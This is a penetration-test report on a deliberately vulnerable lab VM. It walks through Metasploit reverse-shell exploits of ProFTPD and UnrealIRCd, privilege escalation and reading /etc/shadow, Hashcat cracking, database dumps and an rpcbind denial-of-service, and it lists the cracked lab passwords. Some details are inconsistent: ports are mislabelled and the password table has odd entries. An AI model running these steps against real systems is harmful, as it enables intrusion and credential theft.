---
layout: '../../layouts/MarkdownPost.astro'
title: 'IS Security and Risk Management Report: How Vulnerable is an Enterprise？'
pubDate: 2023-12-11
description: 'A team group security business report for a company in a real simulated environment.'
author: 'Terry'
cover:
    url: 'https://s2.loli.net/2023/12/10/TBGrwdOF4WpPEf2.png'
    square: 'https://s2.loli.net/2023/12/10/TBGrwdOF4WpPEf2.png'
    alt: 'cover'
tags: ["网络安全","Report"]
theme: 'dark'
featured: true
---

## About this report

We have signed the following contractual agreement with Humbleify for your penetration test assessment:

>Humbleify and your esteemed consultancy hereby enter into a contractual agreement for you to carry out a vulnerability assessment of a specific Humbleify asset described below.

**Objectives**

>Your objectives are threefold:
>
>Document vulnerabilities that you are able to successfully exploit on the server. Describe in detail what you did and what level of access you were able to obtain. If you obtain a user account with limited privileges, document whether you were able to escalate the privileges to root. Document each exploit that you are able to successfully launch.
>
>Document potentially sensitive information that you are able to obtain from the server. These could include user files or web, database, or other server files.
>
>For both 1 and 2 above, argue for methods that could protect the vulnerabilities and sensitive information from > exploitation.

**Authorization**

>You are hereby authorized to perform the agreed-upon vulnerability assessment of the Humbleify vagrantbox virtual machine with IP address 192.168.56.200. Your scope of engagement is exclusively limited to the single Humbleify asset.
>
>You may:
>
>Access the server through any technological means available.
>Carry out activities that may crash the server.
>
>You may not:
>
>Social engineer any Humbleify employees.
>Sabotage the work of any other consultancy team hired by Humbleify.
>Disclose to any other party any information discovered on the asset.
>
>Furthermore, note the following:
>
>This is a vagrantbox development version of a live asset. The vagrant-standard privileged user vagrant is present on this virtual machine, but not on the live version of the asset. Therefore, any access via the vagrant user is moot and out of scope.

The company has given you access to a vagrantbox virtual machine version of their webserver. It is hosted on vagrantcloud as box deargle/pentest-humbleify. To launch the virtual machine, follow the instructions on https://github.com/security-assignments/pentest-humbleify.
## Table of Contents

**[Executive Summary](#executive-summary)**

**[I. Project Scope Description](#i-project-scope-description)**

[1.1. Objectives](#11-objectives)

[1.2. Authorization](#12-authorization)

**[II. Target of Assessment](#ii-target-of-assessment)**

[2.1. Operating System: Linux 3.2 - 4.9.](#21-operating-system-linux-32---49)

[2.2. User accounts](#22-user-accounts)

[2.3. Services running](#23-services-running)

[2.4. Noteworthy Installed Applications](#24-noteworthy-installed-applications)

**[III. Relevant Findings](#iii-relevant-findings)**

[3.1. Initial vulnerability scans and reports](#31-initial-vulnerability-scans-and-reports)

[3.2. Accessing open port 6667 IRC](#32-accessing-open-port-6667-irc)

[3.3. Sudo exploitation](#33-sudo-exploitation)

[3.4. Hash dump and password cracking](#34-hash-dump-and-password-cracking)

**[IV. Supporting Details](#iv-supporting-details)**

[4.1. Initial vulnerability scans and reports](#_Toc144071754)

[4.2. Shell access through open port 21 FTP](#42-shell-access-through-open-port-21-ftp)

[4.3. ProFTPD](#43-proftpd)

[4.4. Accessing open port 6667 IRC](#44-accessing-open-port-6667-irc)

[4.5. Exploiting open port SSH 21 and MySQL 6667](#45-exploiting-open-port-ssh-21-and-mysql-6667)

[4.6. Open port 111 RPC Denial of Service attack](#46-open-port-111-rpc-denial-of-service-attack)

**[V. Vulnerability Remediation](#v-vulnerability-remediation)**

[5.1. Port 6667/tcp](#51-port-6667tcp)

[5.1.1. Port monitoring](#511-port-monitoring)

[5.1.2. Version updates](#512-version-updates)

[5.1.3. Permissions and supervisions](#513-permissions-and-supervisions)

[5.1.4. Regular penetration tests](#514--regular-penetration-tests)

[5.2. Passwords – related mistakes](#52-passwords--related-mistakes)

[5.3. Unencrypted data](#53-unencrypted-data)

[5.4. MySQL accessibility](#54-mysql-accessibility)

[5.4.1. Access restrictions](#541-access-restrictions)

[5.4.2. Cybersecurity training](#542-cybersecurity-training)

[5.4.3. MySQL version updates and penetration tests](#543-mysql-version-updates-and-penetration-tests)

[5.5. Sudo exploitation](#55-sudo-exploitation)

[5.5.1. Sudo Permission](#551-sudo-permission)

[5.5.2. Sudo version updates](#552-sudo-version-updates)

[5.6. ProFTPD](#56-proftpd)

**[VI. Glossary](#vi-glossary)**




# Executive Summary

We conducted a vulnerability analysis on behalf of Humbleify (blah blah blah)

Our evaluation on the target asset identified several vulnerabilities which includes gaining access to sensitive information without authorization, running malicious code that could interfere with vital systems. The following will list the potential vulnerabilities along with the impact they could have on the system:

**UnrealIRCD 3.2.8.1 backdoor** command access execution allowed access into tylers home directory. This backdoor was present in Unreal3.2.8.1 during November 2009 until June 12th 2010.

**ProFTPD 1.3.5** exploits a command in ProFTPD version 1.3.5 anyone with unauthorized access can use these commands to create a shell that copies any file to a chosen destination, PHP remote code execution is also possible with this exploit.

**SSH and MySQL** were vulnerable due to having weak security, exposing 436428 passwords, emails, credit card information of customers withing the Humbleify system.

**Sudo permission vulnerabilities** allow access into password hashes and launch programmes without authorization. Anonymous users who have no privileges can gain root access and control the system from within.

These were some of the notable vulnerabilities within the system. The following is a summary of the remediations for these primary vulnerabilities.

**Port 6667/tcp:** which is frequently being targeted by cybercriminals. The team recommends that Humbleify carefully monitor this port, maintain regular updates, and restrict access in order to readily detect abnormal traffic. The team also recommends that the organisation conduct regular penetration testing in order to swiftly identify and address any associated vulnerabilities.

**Password-related mistakes** that are easily guessed or cracked due to company- and employee-related information that is not stored in a secure location. Therefore, the team recommended that the employees immediately change their passwords, create a unique account for each employee authorised to access the confidential database, and implement the two-factor authentication (2FA) method to enhance the password security. Additionally, the company should provide routine training for its employees to ensure that they are all aware of the significance of passwords and how to store them securely using encrypted data or secured folders.

**Unencrypted data**, which could be exploited by cybercriminals to acquire sensitive information. As previously stated, it is recommended that sensitive information be encrypted and securely stored. The company should establish multiple levels of management permissions for data management to ensure that employees have only the necessary access and permission to work with the file without modifying the data. In addition, it is suggested that Humbleify perform regular backups to prevent data loss, theft, and potential technical issues.

**A MySQL database** without restricted access could be exploited for data exploitation by cybercriminals. In addition, unauthorised access leads to data modification, which can cause severe damage to the organisation. It is recommended that Humbleify strictly control access to the MySQL database by reviewing the roles and responsibilities of employees and granting them only the level of access necessary for them to perform their jobs. Additionally, the company should provide training on MySQL so that employees comprehend the significance of MySQL databases and are able to detect unauthorised database access.

**Sudo exploitation**: The team discovered the vulnerability in sudo, disclosing a method for exploiting it to gain elevated system privileges and access sensitive data stored in unencrypted files. Due to the importance of data security, the company should refine permission assignments, limit sudo access to specific job functions, keep detailed sudo activity logs, and conduct regular assessments to ensure exclusive sudo access for active employees. In order to prevent potential cyber threats resulting from sudo version vulnerabilities, it is suggested that maintaining security requires regular updates of the system's critical version and upgrades.

**ProFTPD**: After exploiting ProFTPD, the team advises Humbleify to update regularly to avoid vulnerabilities in previous versions that attackers could exploit. It also includes maintaining ProFTPD and the operating system with the most recent security updates. It is recommended to regularly review activity records to promptly identify unusual activities and effectively manage access. Additionally, the team recommends a cautious approach to permissions, granting access to only those whose responsibilities are directly related to the server.
#### It is strongly suggested that Humbleify consider these remediations and promptly address any critical vulnerabilities within 30 days to ensure that potential risks are mitigated.

# I. Project Scope Description

The purpose of this project is to plan and execute a thorough security assessment of Humbleifys web server which will identify any potential vulnerabilities and weaknesses in the system, along with providing a good plan to fix these issues.

We obtained legitimate authorization to perform the agreed-upon vulnerability assessment of the Humbleify vagrantbox virtual machine with IP address 192.168.56.200. This assessment is limited to individual Humbleify assets within the scope of authorization, and no illegal or unauthorized activities will be involved. This project started on August 15th, and ends on August 27th, inline with the project scope statement.

## 1.1. Objectives

We have entered into a contractual agreement with Humbleify for us to carry out a vulnerability assessment of a specific Humbleify asset hosted on vagrantcloud at deargle/pentest-humbleify.

The agreed-upon objectives are threefold:

1.  Document vulnerabilities that you are able to successfully exploit on the server. Describe in detail what you did and what level of access you were able to obtain. If you obtain a user account with limited privileges, document whether you were able to escalate the privileges to root. Document each exploit that you are able to successfully launch.

2.  Document potentially sensitive information that you are able to obtain from the server. These could include user files or web, database, or other server files.

3.  For both 1 and 2 above, argue for methods that could protect the vulnerabilities and sensitive information from \> exploitation.

## 1.2. Authorization

We are operating under the following authorization:

You are hereby authorized to perform the agreed-upon vulnerability assessment of the Humbleify vagrantbox virtual machine with IP address 192.168.56.200. Your scope of engagement is exclusively limited to the single Humbleify asset.

You may:

-   Access the server through any technological means available.

-   Carry out activities that may crash the server.

You may not:

-   Social engineer any Humbleify employees.

-   Sabotage the work of any other consultancy team hired by Humbleify.

-   Disclose to any other party any information discovered on the asset.

Furthermore, note the following:

-   This is a vagrantbox development version of a live asset. The vagrant-standard privileged user vagrant is present on this virtual machine, but not on the live version of the asset. Therefore, any access via the vagrant user is moot and out of scope.

# II. Target of Assessment

In this section, the team will describe the key information obtained from the target server, including user accounts, services running, noteworthy installed applications, and so on. Based on this information, the team will evaluate the primary target of the attack and select an appropriate way to execute it.

## 2.1. Operating System: Linux 3.2 - 4.9.

-   Linux kernel 4.9 was released on December 11th, 2016. This version is now marked as EOL, which means that it will no longer receive maintenance and security updates. As time increases, the likelihood of experiencing a vulnerability attack is high.

## 2.2. User accounts

-   The team found 8 accounts on the server (see table 1 below) and we will try to crack the passwords and elevate to Root.

## 2.3. Services running

-   RPCBIND: The RPCBIND service allows remote procedure calls, but may be at risk of remote code execution and denial of service. This service currently faces a serious vulnerability threat and will be the target of our subsequent attacks.

-   MySQL: MySQL is the database system using to store important data.

-   SSH: SSH service allows users to log in to the server remotely, but it may face password guessing and authentication issues.

-   HTTP: HTTP services keep websites online but may be subject to cyber-attacks such as cross-site scripting and data injection.

-   FTP ProFTPD: FTP services are used for file transfers, but there is a risk of authentication bypass and denial of service.

-   IRC UnrealIRCD: The IRC service is used for live chat, but can be affected by malicious users and channel spam.

## 2.4. Noteworthy Installed Applications

-   MySQL: MySQL is the database system using to store important data. It may contain a lot of critical data and will be targeted by the team.

**Table 1 – Server Description**

| **Key**                           | **Value**                                                                       |
|-----------------------------------|---------------------------------------------------------------------------------|
| Operating System                  |  Linux 3.2 - 4.9                                                                |
| MAC Address                       |  52:54:00:5B:7A:33 (QEMU virtual NIC)                                           |
| User accounts                     |  Vagrant   tyler  bcurtis  bschneider  cincinnatus  jamescochran  marlah  mzimm |
| Services running                  | FTP ProFTPD  SSH HTTP RPCBIND IRC UnrealIRCD  MySQL                             |
| Noteworthy Installed Applications | MySQL                                                                           |
| Web sites hosted                  | humbleify                                                                       |
| Databases, and stored information | MySQL - humbleify                                                               | 

# III. Relevant Findings

In this assessment, the team will act as a malicious attacker and reveal an exploitation of serious open port vulnerabilities in Humblify. The team will demonstrate how someone could gain access to sensitive information, manipulate data, or destroy important files that could lead to serious financial implications for the company.

## 3.1. Initial vulnerability scans and reports

Running an automated scan on Humblify revealed the most serious vulnerabilities, which were FTP, SSH, HTTP, RPC, MySQL, and IRC ports. For more details on these ports, please refer to section 4.

The first thing an attacker would use is a vulnerability scanning tool such as \`nmap\`. This is a command in Linux that scans a network for any information regarding open ports and services running on those ports. Once the attacker has identified the open ports and services running on those ports, they can use this information to launch targeted attacks against the system.

![|inline](https://s2.loli.net/2023/12/10/rgVDF9s87CyEHSQ.png)

## 3.2. Accessing open port 6667 IRC

An attacker can use an automated scan to find open ports that are vulnerable to exploit. One such port is 6667, which runs an IRC service using UnrealIRCd software. This service is currently vulnerable to attack and could be used as a potential entry point for an attacker. An IRC daemon is a program that implements the IRC protocol on behalf of an IRC network. The UnrealIRCd server software provides the infrastructure for an IRC network, allowing users to connect to the network and communicate with each other in real-time. A hacker could potentially use Metasploit, a Linux tool designed for exploiting vulnerable services to enter a server anonymously. To exploit this vulnerability, the attacker could open up Metasploit and search for an UnrealIRCd exploit. For more information on the detailed IRC exploit procedure, please refer to section IV.

![|inline](https://s2.loli.net/2023/12/10/SrbwEVUoRuxfats.png)

They will use a matching module to gain backdoor access into UnrealIRCd. A backdoor is a method that allows someone to remotely access a device and bypass normal security measures, this is dangerous because it allows unauthorized users to gain access to sensitive information and control over a system without the knowledge of the owner or administrator. A potential impact of having this kind of vulnerability could often be felt when it is used by a cybercriminal to steal personal and financial data, install malware or hijack devices connected to the network.

![|inline](https://s2.loli.net/2023/12/10/Wl69BeRIfUZbPKg.png)

To exploit this open port, the malicious actor would simply need to set the IP address to match the target network. An IP address is a unique identifier assigned to every device connected to the internet. It is used to identify the source of internet traffic allowing data to be transmitted between devices.

![|inline](https://s2.loli.net/2023/12/10/rgVDF9s87CyEHSQ.png)

An attacker would find the relevant payload and select a method to gain access to the target system without being detected. This method is called a reverse shell, a reverse shell is a type of shell session that is established on a connection initiated from a remote machine, rather than from the local host. Once they have access, they can explore the system further and perform various actions without the owner’s knowledge or permission.

![|inline](https://s2.loli.net/2023/12/10/MP9Zysuw71ncrSW.png)

The attacker would set a up attack and then run the exploit; in this case our attacker was able to gain access into Tylers account. The account tyler@vagrant had a main directory which contained a lot of interesting notes which could provide attackers with clues on upgrading system privileges to gain root access. Gaining root access gives a malicious actor power over the network, allowing them to easily access sensitive information or even manipulate important files and documents.

![|inline](https://s2.loli.net/2023/12/10/zFqjUSxvtGbcyoB.png)

## 3.3. Sudo exploitation

After looking into one of the notes, our hacker finds a method to upgrade their privileges to root user. In order to upgrade the account, a simple command called sudo su was initiated. Sudo su is a Linux terminal command short for super user do which allows the attackers to upgrade their privileges from tyler@vagrant to root@vagrant.

![|inline](https://s2.loli.net/2023/12/10/SfDEcTKQbWNz7AZ.png)

After gaining root access, the malicious actor can see all users in the system.

![|inline](https://s2.loli.net/2023/12/10/DZSKNjW8gVRtrqF.png)

It is recommended that Humblify should ensure the port is carefully monitored while also maintaining automated updates to get the latest version. Additionally, the company should also set up access restrictions and conduct rountine penetration assessments to detect unauthorised attempts from the backdoor and non-human traffic through the port 6667. See Sub-Section 5.1.

## 3.4. Hash dump and password cracking

One way an unwanted guest might be able to gain passwords of these users, would be to extract something called hashes. Hashes are a way of encrypting passwords to protect them from being stolen by hackers. A strong hash is not easily decrypted but weak hashes on the other hand could be decrypted and reveal any sensitive information within. Since the attacker has root access, they can extract these hashes by going through a folder called /etc/ and reveal the contents of user's password hashes in a text file called shadow.

![|inline](https://s2.loli.net/2023/12/10/oE4lvX5PAwahVnD.png)

These are the passwords of all users on the system encrypted as hashes, these hashes could potentially be copied over into the attacker's machine and decrypted. A tool called Hashcat allows anyone to decrypt hashes offline by providing a dictionary or wordlist to use against it.

![|inline](https://s2.loli.net/2023/12/10/5gLiEXMJQAS8r3O.png)

Hashcat allows the attacker to use millions of passwords to guess the contents of the encrypted file. In this case after running Hashcat, the output reveals the passwords of 4 users that has been cracked by the algorithm.

![|inline](https://s2.loli.net/2023/12/10/dyC2eJgqQupb8DY.png)

Thus, this demonstration was a high-level example of how a potential attacker could exploit the vulnerabilities of an open port to gain access to passwords of employees and access other sensitive information. Refer to section 4 for a detailed breakdown of these exploits, by having root access, a cybercriminal could potentially manipulate files, download or delete anything they want on the machine.

Additionally, after having 4 initial passwords, when the team used Brent’s password to access the system via ssh, it was discovered that Brent Curtis had concealed the Salary App's admin password in the "salary_app" directory. As this folder was not password-protected, the team was able to quickly locate the unencrypted "example. rb" file, which contained the username and password needed to access the Salary App website. 

![|inline](https://s2.loli.net/2023/12/10/BlEHNIKTW1Xx5ud.png)

The result is shown as follows:

![|inline](https://s2.loli.net/2023/12/10/aRizLw3um2UnBOZ.png)

Even though this table is not editable, the team had gain overall confidential information about the salary of all employees. Therefore, according to the guidelines outlined in Sub-Section 5.2, it is highly recommended that all employees should immediately change all passwords and store them in a secure manner.

**Table 2 – Passwords Obtained**

| **Username**                            | **Password**      |
|-----------------------------------------|-------------------|
| jamescochran                            | jamescochran      |
| ' or 1=1                                | yeet              |
| marlah                                  | halram            |
| bcurtis                                 | motocross4ever    |
| cincinnatus                             | hellohello23      |
| mysql -h 127.0.0.1 -u root -p humbleify | thetiffzhang      |
| tyler                                   | tylerHumbleify123 |
| bschneider                              | humblinghumbleify |

**Table 3 – Other Sensitive Information Obtained**

| **Name**                                       | **Description**                                                                                                                                                                                             | **Cross-references** |
|------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------|
| MySQL Database                                 | MySQL is running on an open port hosting all sensitive information of customers and employees which included 436428 passwords, emails, credit card information were accessed. See section 5.4 for solutions |      4.5, 5.4        |
| Tyler Henry – Director of Software Development | Notes on SQL hash, webdav, sudo exploits and root access. This issue can be fixed by having encrypted data or a stronger password, refer to section 5.3 and 5.2.                                            |  4.3, 4.4, 5.3       |
| Employee Salaries                              | The exploitation of FTP port 21                                                                                                                                                                             | 4.5, 4.1             |

**Table 4 – Vulnerable Services**

| **Service** | **Description**                                                                                                                                                                                                                                                                                                                                                                                            | **Cross-references** |
|-------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|----------------------|
| SSH         | The version of SSH installed on the server was OpenSSH 6.6 1p1 Ubuntu, which is weak and could be accessed through open port 21. Allowing anonymous access into the network.                                                                                                                                                                                                                               | 4.5, 5.1             |
| FTP         | The server is running FTP application ProFTPd version 1.3.5, which is vulnerable to a remote shell exploit which would allow anyone to access the systems.                                                                                                                                                                                                                                                 | Section 4.2, 5.2     |
| IRC         | The version of UnrealIRCD that was running allowed for Backdoor Command Execution. This gave a direct access into the tyler@vagrant account which lead to privilege escalation giving us Root access. By gaining access into Root@vagrant account, it resulted in a hash dump of all employee passwords. Immediate updates to the services could provide a solution to these issues see 5.1.2 for details. | 4.3, 5.1.2           |
| RPC         | This port is running a version of rpcbind 2-4 which was found to be vulnerable to a denial-of-service attack using Metasploit. An updated version of this service would remediate this, see section 5.1.2.                                                                                                                                                                                                 | 4.6, 5.1.2           |

# IV. Supporting Details


## 4.1. Initial vulnerability scans and reports

The **nmap** command and **Nessus** were used to run automated scans of potential vulnerabilities in the network. This information was used for the initial discovery phase which led into the exploitation of open ports within the target asset IP 192.168.56.200.
```
Nmap report:   
Notable vulnerabilities in FTP, SSH, HTTP, RPC, MySQL, IRC.

Nmap scan command:   
nmap -T4 -A -sV 192.168.56.200
```

![|inline](https://s2.loli.net/2023/12/10/rgVDF9s87CyEHSQ.png)

## 4.2. Shell access through open port 21 FTP

We discovered this vulnerability by using nmap and Nessus, Metasploit was then used to run a search of ProFTPD module used to exploit open port 21, the following is a description of the ProFTPD 1.3.5 Mod_Copy Command Execution.  
  
*“This module exploits the SITE CPFR/CPTO mod_copy commands in ProFTPD version 1.3.5. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the 'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website directory, PHP remote code execution is made possible.”* (Rapid7,n.d.).

## 4.3. ProFTPD

**We performed this exploit by using these commands to open a reverse shell:**
```
1.  Open Kali Linux Terminal and open Metasploit

2.  msfconsole

3.  Setting up ProFTPD 1.3.5 Mod_Copy Command Execution module:

4.  search proftpd

5.  use 4

6.  set Rhost 192.168.56.200

7.  set sitepath /var/www/html

8.  Setting up relevant payload options to get reverse shell access

9.  show payloads

10. set payload 5

11. set Lhost 192.168.56.101

12. set Lport 4444

13. Exploit the system

14. Exploit
```
![|inline](https://s2.loli.net/2023/12/10/kKrDdRi9NZsayL5.png)

Due to this breach, we were able to obtain the SQL connection credentials by exploiting payroll_app.php. This allowed us to perform SQL injection and access sensitive database tables with customer and employee information.

## 4.4. Accessing open port 6667 IRC

We previously discovered this vulnerability using nmap and Nessus, Metasploit was then used to run a search of th unrealIRCD module used to exploit open port 6667, the following is a description of the UnrealIRCD 3.2.8.1 Backdoor Command Execution.  
  
*“This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010”*

(Rapid7,n.d.). *  
  
**We performed this exploit by using these commands to open a reverse shell:**
```
1.  Open Kali Linux Terminal and open Metasploit:

2.  msfconsole

3.  Setting up UnrealIRCD 3.2.8.1 Backdoor Command Execution module:

4.  search unrealircd

5.  use 0

6.  set Rhost 192.168.56.200

7.  Setting up relevant payload options to get reverse shell access:

8.  show payloads

9.  set payload 7

10. set Lhost 192.168.56.101

11. set Lport 4444

12. Exploit the system:

13. Exploit
```
![|inline](https://s2.loli.net/2023/12/10/3sCaPNl1rJwokeZ.png)

This breach allowed us to gain root access and we were able to obtain a hash dump of all employee passwords. After gaining root privileges we were able access other sensitive information such as emails and various notes left by employees.

## 4.4. Hash dump and password cracking

Diving deeper into these exploits, we discovered these vulnerabilities allowed us to gain access to a file called shadow in the /etc folder which contains all the hashes for employees.

The following commands were used once we had access into IRC:

Escalating privileges from tyler@vagrant:
```
-   Sudo su
```
**1.  You should now be root@vagrant**

**2.  Navigate to the /etc folder and get hash dump**

```
-   cd /etc
-   cat shadow
```
![|inline](https://s2.loli.net/2023/12/10/Izt8vnsPQeHGUxq.png)

On a separate terminal create a text file using nano or vim and copy everything from the first dollar sign up to the semicolon before the numbers e.g.

![|inline](https://s2.loli.net/2023/12/10/kxTaD1z97WHtZV6.png)


**3.  With 7 lines of hashed passwords in our text file, we can now create a wordlist to guess against all 7 hashes at the same time using Hashcat.**

**4.  These following Hashcat commands were used to crack the hashed passwords. To see which passwords have been cracked with these commands refer to Section III:**

```
-   Hashcat -m500 -a 1 --force -o crackedpasswords.txt Humblifyhash.txt /usr/shared/wordlist/rockyou.txt custom_wordlist.txt

-   Hashcat -m500 -a 0 --force -o crackedpasswords.txt Humblifyhash.txt /usr/shared/wordlists/rockyou.txt

-   Hashcat -m500 -a 0 --force -o crackedpasswords.txt Humblifyhash.txt -r /usr/share/hashcat/rules/best64.rule /usr/shared/wordlists/rockyou.txt

-   Hashcat -m500 -a 0 --force -o crackedpasswords.txt Humblifyhash.txt -r /usr/share/hashcat/rules/best64.rule custom_dictionary.txt

-   Hashcat -m500 -a 0 --force -o crackedpasswords.txt Humblifyhash.txt -r /usr/share/hashcat/rules/toggles5.rule /usr/shared/wordlists/rockyou.txt

-   Hashcat -m500 -a 0 --force -o crackedpasswords.txt Humblifyhash.txt -r /usr/share/hashcat/rules/toggles5.rule custom_dictionary.txt

-   Hashcat -m 500 -a 1 --force -o crackedpasswords.txt Humblifyhash.txt custom_dict.txt custom_dict.txt

The team looking for the passwords to access the Salary_App.php on the website by pointing to Brent Curtis as he is the Billing and Revenue person.

-   Gaining access to his account through ssh using his username and password with the following command: ssh bcurtis@192.168.56.200.

-   Listing all directory and file in the main page of his account first using: ls -al

-   Going to the “mail” directory using the command: cd mail

-   There are 2 text file, using cat command to read the file:
```

![cat 1.txt|inline](https://s2.loli.net/2023/12/10/jRPDaEunvBT9UVW.png)

![cat 2.txt|inline](https://s2.loli.net/2023/12/10/qCBOLh7P6xyd8aN.png)

The 1.txt using Ceasar Cipher which is deciphered as follows: “Hah, too easy. This salary app is so easy to SQL Inject. I'll send you my proof of concept script later.” . It means that there is something in the “scripts” directory.
```
cd scripts
```
-   The salary_app directory appears, using the same cd command to get inside the directory: cd salary_app

-   After getting access into the directory and list out everything, the cat command will be used to look at the example.rb, which would show how to access the Salary_App.php:

![cat example.rb|inline](https://s2.loli.net/2023/12/10/TnA3bNzraIYl4iH.png)

-   Going to the website, scroll down to the bottom and access the Salary_App using the provided username and password, the result will be as follows:

![|inline](https://s2.loli.net/2023/12/10/FDRySn8HsVWEhvm.png)

-   As 2.txt also used Caesar Cipher, after deciphering, the result is a hint to bypass into the system: “If idiot management kicks me out, I have a way back in and I'll make them regret it. Phase 1 is port 1525. Phase 2 is documents.txt.”.

The team moved to crack the hashdump in order to figure out the root password to MySQL database. Cracking the hash dump allowed us to break into multiple accounts of various employees:

![|inline](https://s2.loli.net/2023/12/10/ZC6AUPNRJiQ9pxV.png)

We obtained other sensitive information about Humblify such as a MySQL hash from one of the employee’s notes.

![|inline](https://s2.loli.net/2023/12/10/wofBtN4pSPdVF1x.png)
The MySQL hash 8ad008832557602aa52b8b498f3813a0 with salt 1234 is an MD5 hash which could be cracked by Hashcat.

The following Hashcat command was used to crack this password:

-   Hashcat -a 0 -m50 --force -o sqlcracked.txt ‘8ad008832557602aa52b8b498f3813a0:1234’ -r /usr/share/hashcat/rules/best64.rule custom_dictionary.txt
![|inline](https://s2.loli.net/2023/12/10/7eV5TdgAkCqJ2z6.png)

The impact of obtaining a hash dump and subsequently the passwords, leaves the company exposed to all sorts of attacks from malicious actors which cannot be ignored. Therefore, the company should refer to Sub-Sections 5.2, 5.3 and 5.4 for solutions and how to mitigate the risks.

## 4.5. Exploiting open port SSH 21 and MySQL 6667

After obtaining the employee passwords, we discovered an exploit which allowed us to access MySQL database of Humblify through an open SSH port.

The following procedure and commands were used to access MySQL database:
```
1.  SSH bcurtis@192.168.56.200

2.  Type in cracked password: motocross4ever

3.  Once in bcurtis@vagrant type in the following to access MySQL: mysql -h 127.0.0.1 -u root -p humbleify

4.  Use the cracked password: thetiffzhang

5.  Once in SQL type: SELECT \* FROM employees;  
    
6.  To reveal customer database use: SELECT \* FROM customers;
```
![|inline](https://s2.loli.net/2023/12/10/DyqVbcJfGdsmg1F.png)
![|inline](https://s2.loli.net/2023/12/10/RZKyzoH7uxnBwdl.png)

Having all this sensitive information available leaves the company liable for a massive data breach and is a major risk factor in maintaining customers safety. The severity of this cannot be understated as immediate remediations should be considered, refer to sub-section 5.2 and 5.4 for immediate remediation.

## 4.6. Open port 111 RPC Denial of Service attack

The open port in 111 runs a version of RPCbind 2-4 which was vulnerable to a denial-of-service attack, which allows an attacker to trigger large memory allocations on the target. The following is a description of the module that was found in the Metasploit database which exploits this vulnerability.

“This module exploits a vulnerability in certain versions of rpcbind, LIBTIRPC, and NTIRPC, allowing an attacker to trigger large (and never freed) memory allocations for XDR strings on the target.” (Rapid7, n.d)

**We performed this exploit by using these commands:**
```
1.  Open msfconsole

2.  Search rpcbind

3.  Use 0

4.  Show options

5.  Set rhost 192.168.56.200

6.  exploit
```
![|inline](https://s2.loli.net/2023/12/10/4t6gI5H13lDzwBS.png)
# V. Vulnerability Remediation

## 5.1. Port 6667/tcp

### 5.1.1. **Port monitoring**

According to Section 3.2, the team was able to exploit the system by accessing port 6667/tcp. This port is generally used for Internet Relay Chat (IRC), which enables users to connect to IRC servers and participate in conversations with other users in various channels or rooms (Esler, 2009). However, due to its common usage in IRC conversations, port 6667 has also been linked with cyber attacks (Francois et al., 2008). Hence, it is recommended that port 6667 be thoroughly monitored. In addition, it is strongly advised to keep an eye out for non-human traffic and to have internal IRC server scanners in order to identify potential attacks (Cooke & Jahanian, 2005).

-   Adopting network monitoring tools or in-house IRC server scanners in order to supervised traffics and detect suspicious acitivities on port 6667. Any suspicious traffics or activities will be notified and report automatically to the supervisor.

-   Building an in-house machine learning to detect non-human activities happening on this port.

-   Regularly scanning the network to quickly remove any unauthorised IRC servers and mitigate the risks.

### 5.1.2. **Version updates**

Additionally, this remote IRC server integrates an UnrealIRCd-based backdoor. As Nessus (Tenable, 2018) identifies it as a critical vulnerability, the team recommends that Humbleify reinstall UnrealIRCd in order to have the latest version.

-   Maintain automatic UnrealIRCd updates in order to ensure the system has the latest version.

### 5.1.3. **Permissions and supervisions**

Moreover, as this remote server opens a gateway permitting unauthorised access to the system, Humbleify should monitor the permissions of user accounts, including the backdoor accounts, and consider removing unauthorised accounts from the system (See Sub-Section 3.2.9). In order to detect any anomalous activity emanating from the backdoor, it is also recommended that Humbleify conduct a routine log review to identify any potential attacks or unauthorised attempts to take over control of the system.

-   Conducting a thorough assessment on the permission of user accounts and backdoor accounts to ensure that the minimum permissions are sufficient for those who need to perform tasks related to UnrealIRCd.

-   Log assessment should be reviewed and supervised regularly in order to adjust the permission of the user accounts if necessary, detect unauthorised access and resolve issues quickly.

-   Conducting routine employee training, particularly for employees whose job responsibilities involve IRC servers, to ensure that they are aware of the security risks and have the necessary knowledge to perform their duties in UnrealIRCd.

### 5.1.4.  Regular penetration tests

Furthermore, since the team discovered this vulnerability through the penetration test, it is suggested that Humbleify continue to conduct regular penetration tests so that any vulnerabilities associated with this port can be swiftly resolved and remedied. See Section III.

-   Penetration test should be conducted regularly under supervision to identify and ensure any risk associated with the port 6667 could be quickly remediated.

## 5.2. Passwords – related mistakes

According to Sub-Section 3.4, the company's employees made the following errors, allowing passwords to be readily guessed or cracked. The first category of errors involves passwords and usernames that are identical; for instance, James Cochran's username and password are both his name. Another common type is company-related passwords, such as Tyler Henry's "tylerHumbleify123," which could be easily guessed by an attacker and exploited with a dictionary attack. The third type of error involves passwords related to the list of easy-to-guess passwords, such as the reversed name of the user (Marla Hayes' username is "marlah" and her password is "halram"), or "hellohello123" for Meg Campbell. The final common error is how and where employees choose to store passwords, such as computer notes, internal emails, or even the recycle bin, which could be readily obtained if an attacker gains control of the system through backdoor exploitation. Therefore, it is highly recommended that employees should change their passwords immediately and store their passwords privately to a place only them can have an access to these passwords.

-   Passwords should be changed in a way that has nothing to do with employee information or the organisation.

-   Employees should have unique passwords for each account, making it more difficult for assailants to gain access from one account to another, thereby reducing the risk of cyber attacks.

-   The password should contain special characters or phrases that are associated with the user's personal experiences so that only they can recall them.

-   Password Managers such as 1Password and Bitwarden should be used to securely store employee credentials. Any passwords stored on unprotected websites or in unencrypted files should be deleted permanently to prevent them from being accessed by attackers.

-   Employees should implement 2-Factor Authentication (2FA) to make access more difficult, as an attacker would be unable to input the unique code sent to them even if the password was compromised. The 2FA method would also allow employees to be notified when their accounts are compromised. It is strongly suggested that Humbleify provide its employees with security tokens in order for them to adopt the 2FA method.

## 5.3. Unencrypted data

As previously mentioned in Sub-Section 3.4, passwords were not store in protected and encrypted files, which could be easily obtained to elevate the control privileges of the system. Therefore, it is highly recommended that company’s data, including internal emails or files should be encrypted and set up access restriction. This method will avoid any unauthorised attempts to read and manipulate sensitive information, mitigate the risk of privillege elevation and maintain clear procedures in data accessibility, which could make the data management easier.

